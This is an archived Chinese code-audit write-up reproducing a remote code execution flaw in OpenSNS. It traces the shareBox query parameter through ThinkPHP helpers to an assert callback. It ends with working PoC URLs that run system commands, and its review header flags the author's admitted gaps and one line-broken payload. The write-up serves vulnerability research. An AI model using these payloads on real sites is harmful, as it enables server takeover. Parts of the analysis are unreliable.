---
source: "MrWQ/vulnerability-paper"
product: "OpenSNS package Uploads_Download_2020-05-14_5ebca066a3fef"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "代码审计 -  opensns 代码审计复现"
prerequisites: "来源所述条件，未列明部分仍待核：Weibo shareBox and Common Schedule model exposed; oldPHP assert strings/native calls; auth未说明"
side_effects: "未执行；本文需注意的操作影响：影响版本只是下载包名，无发行版本/哈希；系统工具年份不是产品版本；推广相关文章可清理"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/mMRkMHP7DKDqJvW4Vtj_4Q"
id: "vw-dea18ac3e79509ba3cbf9fe2"
entity_id: "ve-dea18ac3e79509ba3cbf9fe2"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Weibo shareBox and Common Schedule model exposed; oldPHP assert strings/native calls; auth未说明

- **结论使用边界（1）**：作者明确_validationFieldItem如何可达未理解，应保留分析不确定性而非完整证明。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：与306同载荷含\[6\]\[\]未带id、Model/model大小写混用；一处payload在runSchedule/function词中换行损坏。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：D实例化模型不等于调用方法，R远程调用是框架内部调度非网络RPC，术语需校正。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **来源与引用处置（4）**：影响版本只是下载包名，无发行版本/哈希；系统工具年份不是产品版本；推广相关文章可清理。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 代码审计 -  opensns 代码审计复现

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mMRkMHP7DKDqJvW4Vtj_4Q)

前言
==

**申明****：本次测试只作为学习用处，请勿未授权进行渗透测试，切勿用于其它用途！  
**

**本文来自 N1c****E 师傅的投稿，在此表示由衷的感谢。**  

作者寄语：由于本周也是在补天公众号看到了 (moonv) 这位师傅的代码审计文章 [https://mp.weixin.qq.com/s/5_HxHEFrCxOCagGOQPOCDw](https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247490365&idx=1&sn=469a6346f5af4d8e1e22f21145f1a809&scene=21#wechat_redirect)  

想着复现下无奈只有前部分的 poc 而已，剩下的只能自己补上了 ，可能会存在点理解误差。  

（师傅们轻点喷，本人新手文章，耗时一天）

正文
==

**审计工具：**

PhpStudy（2016 版本）、Phpstorm（2020.3.2 版本）

**审计步骤：**

![](../../.resource/remote/1704db8cc5c67c0543278d1d041500c16d8853c55cc23f2bad758792455fc8e8.png)

由于是 thinkphp 框架写的，是（应用 / 控制器 / 方法名）进行访问的，

访问这控制器是 ?s=Weibo/Share/shareBox&query=

往下走就是到 17 行②处，这里将 query 解码的值传到③sharabox.html 页面

![](../../.resource/remote/018da962ee9fb69f95b2e2e6a8ea9579db745a3e64ec6c18abf70656960139b8.png)

```
然后query的值就赋到'param'的参数上面调用Weibo/Share/fetchShare方法。

```

```
而{:W('Weibo/Share/fetchShare',array('param'=>$parse_array))}

```

```
的W方法在ThinkPHP/Common/functions.php的1174行。这里可以参考补天师傅发的文。

```

![](../../.resource/remote/aac8cf414b897a8d72f577ab8b590e131660e606dfca5e72c156661e9787404b.png)

![](../../.resource/remote/317ee2fd7a770a43510aa862fd747a0582b211c76c6bace897c5a83be5db7d19.png)

```
R(方法是远程调用控制器的操作方法 URL 参数格式 [资源://][模块/]控制器/操作

```

```
{:W(‘Weibo（模块、调用地址）/Share（方法）/fetchShare（操作）’,array(‘param’=>$parse_array))}

```

然后我们继续往回看，也就是 sharebox.html 远程调用 Weibo/Share/fetchShare 方法这里。

![](../../.resource/remote/f933dd71775d2e12761dc4c2ec44db996a85b8905930366edfd9f5544738ef78.png)

```
query的值就赋到'param'的参数上面调用Weibo/Share/fetchShare方法。

```

![](../../.resource/remote/d3c116bef6031fb908296571a339bdde1e943ea9a12031889e723cb39353c32d.png)

```
而且D方法只会寻找模块（model）类

```

```
比如你的参数是query=app=Common%26Model=Schedule%26method=runSchedule%26id

```

```
就会搜索Common/Model/ScheduleModel的类

```

```
由于前面的assginFetch方法传入D方法的时候带着‘Weibo/Share’参数

```

```
所以这里只会搜索weibo模块类Weibo/Model/ShareModel

```

![](../../.resource/remote/089740bec4a1f8cd80876b0af75b17bede3983a8ea2c94a24dc56a9d6821ce3a.png)

```
而fetchShare方法里又将值传给assginFetch方法又又传给了getinfo方法。继续往下跟进

```

上面是调用了 D 方法也就是模块类 Weibo/Model/ShareModel

![](../../.resource/remote/33973796e79f1f7107b46f93fe68e023def388d9e81ba31ead2bd8cc49e0f537.png)

```
这里的getinfo方法会将传过来的参数进行判断，如果app、Model、method

```

```
参数都不为空的话就进入D进行实例化（实例化：个人感觉是调用方法的意思）如：query=app=应用名（如：Common、Weibo、Admin）%26Model=模块名%26method=方法名，这里moonv师傅已经给出了前部分的

```

poc：query=app=Common%26Model=Schedule%26method=runSchedule%26id

![](../../.resource/remote/57927f9ca7ee11e6f868680f021723f171eac440b7372a34a875990e61bf9667.png)

这里的调用 D 方法又成了执行 Common/Model/ScheduleModel/runSchedule 方法

![](../../.resource/remote/1e9d33524623fb19a207362c7199558846548924a1aaaf1c51257f162a0fa418.png)  
![](../../.resource/remote/f93ac587edd6ae1686058850c104611b3db54e0a223d408abe48fd4f94c37c8a.png)

```
这里是利用了moonv师傅找出的runSchedule方法然后继续调用D方法进行实例化模块。

```

```
而且这里的参数是需要三个参数，status、method、args，这里有点小绕脑。

```

```
而method是需要‘->’进行分割的，根据前部分的poc再加上现在的参数提示可以组成：

```

```
这里会将method下标的值带入D方法来实例化该模块(Model)类，然后将②带入①的模块类中。

```

![](../../.resource/remote/f9f68dd0dfa3a933132b37356b891c787a35c3aa677f1521257b9090bcbe0e7f.png)

![](../../.resource/remote/c6d1d9569331582ee1c60c7eb649fc1d9a319761774e08f4af9a3ce2c05c8d60.png)

```
继续往下的话就到了_validationFieldItem方法，这里我也不是很清楚怎么进来的，应该的通过Schedulemodel方法进行执行_validationFieldItem吧。

```

```
（PS：有懂的师傅能否讲解一下）

```

![](../../.resource/remote/bd49a217ccfeebbe5417f81f31ebe288f81d27824e228b74cfa5a6e5f07901df.png)

1、要 val 下标 4 的值是 function

2、要 val 下标 6 的值是数组

3、args 会和 data 下标是 val 下标 0 的值

4、要 val 下标 1 的值是 assert

```
师傅们可以百度参考下call_user_func_array代码执行。

```

```
解释第3点：如果val[0]=cmd ,那么data就是data[cmd]

```

```
这下可以构造出poc：

```

```
/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runS

chedule%26id[status]=1%26id[method]=Schedule->_validationFieldItem%26id[4]=functi

on%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(whoami)

```

![](../../.resource/remote/ebd0846a5d80980f5545a1879e4a2c9fb6705f93c872943cf735c1fd4d93ae98.png)

**影响版本：**

目前版本版本：Uploads_Download_2020-05-14_5ebca066a3fef

**实现步骤：**

http://127.0.0.1/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ipconfig)

![](../../.resource/remote/cdf7191bff85c81785c5e38386265944b450665eeb262714eab28fc8beeb1986.png)

**如果对你有帮助的话  
那就长按二维码，关注我们吧！**  

![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)

![](../../.resource/remote/5ddf78d6ebe65766a69e829e9eb3baddd946677f3cfc0008edbc430328dcfc1a.jpg)

![](../../.resource/remote/5c19b8b53f1a113b7b596c610a3ae6943b3ed60c4a2987f6f00fe00090e2fe1e.png)

**![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)**  [经验分享 | 渗透笔记之 Bypass WAF](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486210&idx=1&sn=5c0f6409e51c3c0cfb6bde43f2406409&chksm=c07fb0f6f70839e0e29f4ea9c8655d4ce7690c2a147aeeb74f2827aece58e3746f3f7c4ee562&scene=21#wechat_redirect)

![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)  [什么是 HTTP 和 HTTPS](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486492&idx=3&sn=0a975b99a0351a95eef41d37813f7e5d&chksm=c07fb7e8f7083efe8054f864b5b25541fa3bf19ab311700f29254d03e45a4357069ee07c8802&scene=21#wechat_redirect)  

![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)  [实战 |  BYPASS 安全狗 - 我也很 “异或”](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486492&idx=1&sn=fbd4ca8ed69ba6cb3adbc6ac8561d825&chksm=c07fb7e8f7083efef437eb3d685cc5bd6ac489629c613b5f2ce9ced8a7f8fcd335b6f91821a8&scene=21#wechat_redirect)

右下角求赞求好看，喵~

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
